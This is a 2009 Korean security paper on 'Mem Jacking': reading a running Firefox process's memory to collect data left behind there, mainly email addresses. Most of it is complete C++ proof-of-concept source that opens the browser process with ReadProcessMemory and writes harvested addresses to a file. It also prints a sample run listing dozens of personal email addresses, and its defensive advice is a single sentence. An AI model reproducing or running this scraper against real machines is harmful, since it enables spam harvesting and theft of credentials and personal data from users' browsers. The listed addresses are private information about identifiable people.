@@ -1,0 +1,301 @@
+===========================================
+<< Mem Jacking >>
+
+
+
+by hkpco(박찬암)
+-------------------------------
+mail     - chanam.park@hkpco.kr
+homepage - http://hkpco.kr/
+group    - wowhacker&wowcode
+date     - 2009. 1. 24
+-------------------------------
+===========================================
+
+
+
+1. 서론
+
+얼마전 milw0rm에서 "Mem - Jacking"( http://milw0rm.com/papers/274 ) 이라는 글을 보았다.
+작성자가 이러한 기술명을 택한 이유는 기존에 불리우는 Session-Hijacking, Click-Jacking과
+같은 기술들 처럼 악의적인 의도로 메모리를 가로챈다는 의미로 Mem-Jacking 이라고 부르게
+되었다고 생각하면 될 것 같다. 본 문서에서는 Mem-Jacking에 대한 간략한 설명, 방어책과
+함께 그에 대한 기술 증명 코드를 포함하고 있다.
+
+
+
+
+
+2. 요약 설명
+
+웹 브라우저는 컴퓨터를 사용함에 있어 빠질 수 없는 필수적인 프로그램이다. 나는 어릴적 '인터넷'
+이라고 하면 웹 브라우저를 떠올릴 만큼 그 이미지가 직결되어 있었으며, 범위를 넓혀 오늘날 인터넷을
+이용하는 사람들에게 웹 브라우저의 유용함과 이루 말할 수 없는 장점들이 안겨준 편의성은 한두가지가
+아닐 것이다.
+
+그렇다면 이 웹 브라우저를 거치는 데이터들은 어떠한 것이 있을까? 사용자 아이디와 패스워드부터
+시작해서 메일 주소, URL 기록, 검색 키워드 등 정말 다양한 정보들이 웹 브라우저, 더 정확히 말하면
+웹 브라우저의 메모리를 거칠 것이다. 물론 중요 정보는 암호화 되어 관리되기 때문에 안전하다고 한다.
+하지만, 해당 데이터의 사용을 위해서는 어쩔 수 없이 평문 획득을 위하여 복호화를 거쳐야 하는 경우도
+있을 수 있기 마련이며 이 과정은 당연히 메모리가 이용된다. 그런데 많은 어플리케이션들은 이런식으로
+사용 된 메모리를 깨끗하게 초기화 하는 경우가 드물다. 이런 경우 다른 데이터로 덮어 씌우거나 사용한
+메모리를 해제한다고 해도 중요 데이터가 남아있을 수 있다.
+
+Mem-Jacking은 이러한 문제점을 이용한 것이다. 다시 한 번 간단히 정리하면, 웹 브라우저의 메모리를
+거치는 중요한 정보들이 많음에도 불구하고 이러한 데이터의 사용 이후에도 메모리 클린업을 하지 않기
+때문에 다양한 데이터가 그대로 남아있게 된다. 이를 이용해서 웹 브라우저의 실행 도중에 메모리 스캔을
+통하여 중요 정보들을 수집하는 기술이다.
+
+그런데 사실 메모리를 긁어내는 기술은 운영체제를 막론하고 오래전부터 존재했으며 다만 그 활용에 차이가
+있었을 뿐 전혀 새로운 것이 아니다. 아무튼, milw0rm에 공개된 문서에서는 이를 스패머의 입장에서 다량의
+메일 주소 수집에 이용하는 악의적인 예를 들었는데 실제로 해당 기술을 응용한 악성코드를 제작한다면
+수천, 수만개의 메일 주소 수집은 그리 어려운 일도 아니라는 생각이 든다.
+
+
+
+
+
+3. 실제 적용
+
+실행 중인 파이어폭스(FireFox)의 메모리를 스캔하여 .com, .net, .org 도메인을 포함하는 메일 주소를
+추출하는 프로그램을 통해 테스트해 보자. 중복되는 데이터도 있겠지만 단지 기술의 확인만 하면되므로
+그 부분에 대한 처리는 고려하지 않았다.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+// mem jacking 프로그램 실행
+C:\>mem_jacking.exe
+[Mem Jacking] Working
+[Mem Jacking] Result in C:\mjres.txt
+[Mem Jacking] 193 Found
+[Mem Jacking] Completed
+
+// 결과 파일 확인
+C:\>type mjres.txt
+jqs@sun.com
+mano@mozilla.com
+ehsan.akhgari@gmail.com
+contact@cusser.net
+contact@cusser.net
+mano@mozilla.com
+ehsan.akhgari@gmail.com
+hyatt@netscape.com
+mconnor@steelgryphon.com
+.
+.
+sspitzer@mozilla.org
+zeniko@gmail.com
+doronr@us.ibm.com
+zeniko@gmail.com
+hewitt@netscape.com
+zeniko@gmail.com
+surkov.alexander@gmail.com
+.
+.
+hanjw2@nate.com
+caliphos@naver.com
+hkpco@korea.com
+vortex8539@hanmail.net
+vortex8539@hanmail.net
+11210210@hanmail.net
+caliphos@naver.com
+.
+.
+11210210@hanmail.net
+caliphos@naver.com
+hkpco@korea.com
+vortex8539@hanmail.net
+seaofchaos@inhaian.net
+caliphos@naver.com
+freemail@thawte.com
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+총 193개의 메일 주소를 찾았으며 결과는 C:\mjres.txt 파일에 저장된 것을 볼 수 있다. 중복되는 메일
+주소도 많지만 필요하다면 이는 조금만 코드 수정을 거치면(필요한 사람이 없기를 바란다) 해결할 수 있다.
+
+
+
+
+
+4. 방어책
+
+다양한 방어책을 생각해 볼 수 있겠지만 근본적으로 특정 메모리의 사용이 더이상 필요하지
+않을 경우 가능한 빨리 해당 메모리를 초기화 시켜주는 방법이 가장 확실할 것이다.
+
+
+
+
+
+5. 소스 코드
+
+단지 기술적 증명을 위한 코드이기 때문에 속도, 간결함 등에 크게 신경쓰지 않았으며 코드 또한
+마음에 들지 않지만 Proof Of Concept이라는 미명하에 그대로 남겨둔다. 참고로 milw0rm에 공개된
+문서에서는 MASM을 이용하여 브라우저의 메모리에 .com이 포함된 모든 문자열을 추출하는 코드를
+보여주었는데 결과가 별로 크게 와닫지 않아서 새로 작성해 본 것이다.
+
+
+- Mem_Jacking.cpp -
+
+/*
+	Collecting E-mail address using by Mem Jacking
+
+	by hkpco( hkpco@korea.com )
+	http://hkpco.kr/
+
+	wowhacker&wowcode
+*/
+
+// Comment> I know, this code is very dirty. but I coded for proof of technique.
+
+#include <windows.h>
+#include <stdio.h>
+#include <tchar.h>
+
+#define BEGIN_ADDR  0x1000
+#define END_ADDR    0x70000000
+#define FILE_NAME   "C:\\mjres.txt"
+#define Valid       "0123456789_.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@"
+
+HANDLE hFile;
+char *Tail[] = { ".com", ".org", ".net" };
+int get_num = 0;
+
+bool find_tail( char *pbuf, size_t size );
+// Recursive function for searching that find e-mail address
+
+char *hk_strfnd( const char *str, const char *x, const size_t sz );
+// I made it because strstr function that terminating '\0' character
+
+int _tmain( void )
+{
+	HWND hwnd;
+	HANDLE ph_fox;
+	DWORD pid, rNum;
+	unsigned long m_cnt = 0;
+	char buff[0x1000 +1] = {0x00,}, *p = NULL;
+
+	hwnd = FindWindow( _T("MozillaUIWindowClass"), NULL );
+	if( hwnd == NULL ) {
+		_tprintf( _T("FindWindow() error\n") );
+		return -1;
+	}
+
+	GetWindowThreadProcessId( hwnd, &pid );
+	ph_fox = OpenProcess( PROCESS_VM_READ, TRUE, pid );
+	if( ph_fox == NULL ) {
+		_tprintf( _T("OpenProcess() error\n") );
+		return -1;
+	}
+
+	hFile = CreateFile( _T(FILE_NAME), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
+	if( hFile == INVALID_HANDLE_VALUE ) {
+		_tprintf( _T("CreateFile() error\n") );
+		CloseHandle(ph_fox);
+		return -1;
+	}
+
+	_tprintf( _T("[Mem Jacking] Working\n") );
+	_tprintf( _T("[Mem Jacking] Result in %s\n"), _T(FILE_NAME) );
+
+	for( m_cnt = BEGIN_ADDR ; m_cnt < END_ADDR ; m_cnt+=0x1000 )
+	{
+		ReadProcessMemory( ph_fox, (unsigned long *)m_cnt, buff, 0x1000, &rNum );
+		find_tail( buff, 0x1000 );
+	}
+
+	CloseHandle(ph_fox);
+	CloseHandle(hFile);
+
+	_tprintf( _T("[Mem Jacking] %d Found\n"), get_num );
+	_tprintf( _T("[Mem Jacking] Completed\n") );
+
+	return 0;
+}
+
+bool find_tail( char *pbuf, size_t size )
+{
+	char buffer[0x1000 +1] = {0x00,}, *p;
+	int cnt, i = -1;
+	int flag, mailornot = 0;
+	DWORD num;
+	size_t cnt_in;
+
+	memcpy( buffer, pbuf, size );
+
+	while( Tail[++i] )
+	{
+		p = NULL;
+		flag = mailornot = 0;
+		cnt = 0;
+		cnt_in = 0;
+		// initialization for safety
+
+		p = hk_strfnd( buffer, Tail[i], size );
+		if( p == NULL )
+			continue;
+
+		for( cnt = -1 ;; cnt-- )
+		{
+			flag = 0;
+			for( cnt_in = 0 ; cnt_in < strlen(Valid) ; cnt_in++ )
+			{
+				if( (*(p +cnt)) == Valid[cnt_in] ) {
+					flag = 1;
+
+					if( Valid[cnt_in] == '@' )
+						mailornot = 1;
+
+					break;
+				}
+			}
+
+			if(!flag)
+				break;
+		}
+	
+		// Filtering if there is no account(ex - "@google.com", "@korea.com" strings)
+		if( *(p +cnt +1) == '@' )
+			mailornot = 0;
+
+		if( cnt == -1 ) {
+			find_tail( p +4, (p +4) -buffer +1 );
+			return false;
+		}
+
+		if(mailornot) {
+			WriteFile( hFile, p +cnt+1, 4 -cnt -1, &num, NULL );
+			WriteFile( hFile, "\r\n", 2, &num, NULL );
+			FlushFileBuffers(hFile);
+
+			get_num++;
+		}
+
+		find_tail( p +4, (p +4) -buffer +1 );
+	}
+
+	return true;
+}
+
+char *hk_strfnd( const char *str, const char *x, const size_t sz )
+{
+	int flag;
+	unsigned int cnt, cnt_in;
+
+	for( cnt = 0 ; cnt < sz-strlen(x)+1 ; cnt++ )
+	{
+		flag = 0;
+
+		for( cnt_in = 0 ; cnt_in < strlen(x) ; cnt_in++ )
+		{
+			if( *(str +cnt+ cnt_in) != *(x +cnt_in) ) {
+				flag = 1;
+				break;
+			}
+		}
+
+		if( !flag )
+			return (char *)(str+cnt);
+	}
+
+	return NULL;
+}
